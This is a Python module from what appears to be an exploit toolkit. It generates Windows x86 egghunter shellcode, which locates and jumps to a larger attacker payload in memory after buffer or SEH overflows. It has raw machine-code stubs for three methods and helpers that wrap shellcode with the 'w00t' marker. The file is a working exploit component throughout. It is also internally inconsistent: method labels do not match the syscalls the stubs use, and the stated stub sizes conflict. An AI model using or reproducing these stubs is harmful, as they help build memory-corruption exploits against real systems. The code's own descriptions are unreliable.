# -*- coding: utf-8 -*-
"""
luodllhack/exploit/shellcode/egghunter.py - Egghunter 生成器

Egghunter 是一种内存搜索技术，用于在有限的 shellcode 空间场景下
搜索并跳转到放置在内存其他位置的完整 payload。

支持的方法:
- SEH: 基于 SEH 的 egghunter (32 bytes, Windows)
- NtAccessCheck: 使用 NtAccessCheckAndAuditAlarm 系统调用 (35 bytes)
- IsBadReadPtr: 基于 IsBadReadPtr 的检查

使用示例:
    egghunter = Egghunter()

    # 生成 SEH-based egghunter
    hunter = egghunter.generate(egg=b'w00t', method='seh')

    # 构建完整 payload
    # 在主 payload 中放置: egg + egg + shellcode
    # 在溢出点放置: egghunter stub
"""

import struct
from typing import Optional
from dataclasses import dataclass


@dataclass
class EgghunterResult:
    """Egghunter 生成结果"""
    stub: bytes           # Egghunter stub 代码
    egg: bytes            # Egg 标识符
    method: str           # 使用的方法
    size: int             # Stub 大小
    description: str      # 描述


class Egghunter:
    """
    Egghunter 生成器

    当 shellcode 空间受限时，使用 egghunter 搜索内存中的完整 payload。
    Egghunter 会遍历进程内存空间，寻找特定的 egg 标识符（出现两次），
    找到后跳转到 egg 后面的 shellcode 执行。

    典型使用场景:
    - SEH 溢出后只有很小的空间
    - 栈溢出但返回地址后空间有限
    - 堆溢出利用
    """

    # 预定义的 Egghunter stub
    # 这些是经过验证的 Windows egghunter 实现

    # SEH-based egghunter (32 bytes)
    # 使用 NtAccessCheckAndAuditAlarm (syscall 0x02) 检查内存可读性
    # 避免了访问无效内存时的崩溃
    _EGGHUNTER_SEH = bytes([
        0x66, 0x81, 0xca, 0xff, 0x0f,  # or dx, 0x0fff    ; 页对齐 (4095)
        0x42,                           # inc edx          ; 下一字节
        0x52,                           # push edx         ; 保存地址
        0x6a, 0x02,                     # push 0x02        ; NtAccessCheckAndAuditAlarm syscall
        0x58,                           # pop eax          ; eax = 2
        0xcd, 0x2e,                     # int 0x2e         ; 执行 syscall
        0x3c, 0x05,                     # cmp al, 0x05     ; 检查 ACCESS_VIOLATION (0xC0000005)
        0x5a,                           # pop edx          ; 恢复地址
        0x74, 0xef,                     # je short -17     ; 如果无效，跳到页对齐
        0xb8, 0x77, 0x30, 0x30, 0x74,   # mov eax, 'w00t'  ; 加载 egg (将被替换)
        0x8b, 0xfa,                     # mov edi, edx     ; edi = 当前地址
        0xaf,                           # scasd            ; 比较 [edi] 和 eax
        0x75, 0xea,                     # jne short -22    ; 不匹配，继续搜索
        0xaf,                           # scasd            ; 再次比较 (双 egg)
        0x75, 0xe7,                     # jne short -25    ; 不匹配，继续搜索
        0xff, 0xe7,                     # jmp edi          ; 找到! 跳转到 shellcode
    ])

    # NtAccessCheckAndAuditAlarm 变体 (稍长但更稳定)
    _EGGHUNTER_NTACCESS = bytes([
        0x66, 0x81, 0xca, 0xff, 0x0f,  # or dx, 0x0fff
        0x42,                           # inc edx
        0x52,                           # push edx
        0x6a, 0x43,                     # push 0x43 (NtDisplayString)
        0x58,                           # pop eax
        0xcd, 0x2e,                     # int 0x2e
        0x3c, 0x05,                     # cmp al, 0x05
        0x5a,                           # pop edx
        0x74, 0xef,                     # je short (回到页对齐)
        0xb8, 0x77, 0x30, 0x30, 0x74,   # mov eax, 'w00t'
        0x8b, 0xfa,                     # mov edi, edx
        0xaf,                           # scasd
        0x75, 0xea,                     # jne short
        0xaf,                           # scasd
        0x75, 0xe7,                     # jne short
        0xff, 0xe7,                     # jmp edi
    ])

    # IsBadReadPtr-based (需要已加载 kernel32)
    # 使用 kernel32!IsBadReadPtr 检查内存
    _EGGHUNTER_ISBADREADPTR = bytes([
        0x33, 0xd2,                     # xor edx, edx
        0x66, 0x81, 0xca, 0xff, 0x0f,   # or dx, 0x0fff
        0x42,                           # inc edx
        0x52,                           # push edx
        0x6a, 0x08,                     # push 0x08 (检查8字节)
        0x52,                           # push edx
        0xb8, 0x00, 0x00, 0x00, 0x00,   # mov eax, <IsBadReadPtr地址> (需填充)
        0xff, 0xd0,                     # call eax
        0x85, 0xc0,                     # test eax, eax
        0x5a,                           # pop edx
        0x75, 0xec,                     # jnz short (无效，继续)
        0xb8, 0x77, 0x30, 0x30, 0x74,   # mov eax, 'w00t'
        0x8b, 0xfa,                     # mov edi, edx
        0xaf,                           # scasd
        0x75, 0xe5,                     # jne short
        0xaf,                           # scasd
        0x75, 0xe2,                     # jne short
        0xff, 0xe7,                     # jmp edi
    ])

    # 方法映射
    METHODS = {
        'seh': _EGGHUNTER_SEH,
        'ntaccess': _EGGHUNTER_NTACCESS,
        'isbadreadptr': _EGGHUNTER_ISBADREADPTR,
    }

    # 默认 egg
    DEFAULT_EGG = b'w00t'

    def __init__(self):
        pass

    def generate(self,
                 egg: bytes = None,
                 method: str = 'seh') -> EgghunterResult:
        """
        生成 Egghunter stub

        Args:
            egg: 4 字节的 egg 标识符，默认 b'w00t'
            method: 使用的方法 ('seh', 'ntaccess', 'isbadreadptr')

        Returns:
            EgghunterResult 包含 stub 和相关信息

        Raises:
            ValueError: 如果 egg 不是 4 字节或方法不支持

        Example:
            >>> hunter = Egghunter()
            >>> result = hunter.generate(egg=b'PWND', method='seh')
            >>> print(f"Stub size: {result.size} bytes")
            >>> # 在 payload 中使用:
            >>> full_payload = result.egg + result.egg + shellcode
        """
        # 默认 egg
        if egg is None:
            egg = self.DEFAULT_EGG

        # 验证 egg 长度
        if len(egg) != 4:
            raise ValueError(f"Egg must be exactly 4 bytes, got {len(egg)}")

        # 验证方法
        method = method.lower()
        if method not in self.METHODS:
            raise ValueError(f"Unknown method: {method}. Available: {list(self.METHODS.keys())}")

        # 获取基础 stub
        base_stub = bytearray(self.METHODS[method])

        # 替换 egg 值
        # 查找默认 egg 'w00t' (0x74303077 little-endian) 的位置
        default_egg_bytes = b'\xb8\x77\x30\x30\x74'  # mov eax, 'w00t'
        custom_egg_bytes = b'\xb8' + egg  # mov eax, <custom_egg>

        # 在 stub 中查找并替换
        pos = bytes(base_stub).find(default_egg_bytes)
        if pos != -1:
            base_stub[pos:pos+5] = custom_egg_bytes

        stub = bytes(base_stub)

        # 构建描述
        descriptions = {
            'seh': 'SEH-based egghunter using NtAccessCheckAndAuditAlarm syscall',
            'ntaccess': 'NtDisplayString-based egghunter variant',
            'isbadreadptr': 'IsBadReadPtr-based egghunter (requires kernel32 address)',
        }

        return EgghunterResult(
            stub=stub,
            egg=egg,
            method=method,
            size=len(stub),
            description=descriptions.get(method, 'Unknown method')
        )

    def generate_with_tag(self,
                          tag: str,
                          method: str = 'seh') -> EgghunterResult:
        """
        使用字符串 tag 生成 egghunter

        Args:
            tag: 4 字符的字符串标签
            method: 使用的方法

        Returns:
            EgghunterResult
        """
        egg = tag.encode('ascii')[:4].ljust(4, b'\x00')
        return self.generate(egg=egg, method=method)

    def create_payload_marker(self, egg: bytes = None) -> bytes:
        """
        创建 payload 标记 (双 egg)

        在完整 shellcode 前放置这个标记

        Args:
            egg: 4 字节的 egg 标识符

        Returns:
            8 字节的标记 (egg + egg)
        """
        if egg is None:
            egg = self.DEFAULT_EGG

        if len(egg) != 4:
            raise ValueError(f"Egg must be exactly 4 bytes, got {len(egg)}")

        return egg + egg

    def wrap_shellcode(self,
                       shellcode: bytes,
                       egg: bytes = None) -> bytes:
        """
        用 egg 标记包装 shellcode

        Args:
            shellcode: 原始 shellcode
            egg: 4 字节的 egg 标识符

        Returns:
            egg + egg + shellcode
        """
        marker = self.create_payload_marker(egg)
        return marker + shellcode

    @staticmethod
    def list_methods() -> dict:
        """
        列出所有可用的 egghunter 方法

        Returns:
            方法名到大小的映射
        """
        return {
            'seh': {
                'size': 32,
                'description': 'SEH-based, uses NtAccessCheckAndAuditAlarm',
                'compatibility': 'Windows XP - Windows 10 (32-bit)',
            },
            'ntaccess': {
                'size': 32,
                'description': 'Uses NtDisplayString syscall',
                'compatibility': 'Windows XP - Windows 10 (32-bit)',
            },
            'isbadreadptr': {
                'size': 37,
                'description': 'Uses kernel32!IsBadReadPtr',
                'compatibility': 'Requires known kernel32 base address',
            },
        }
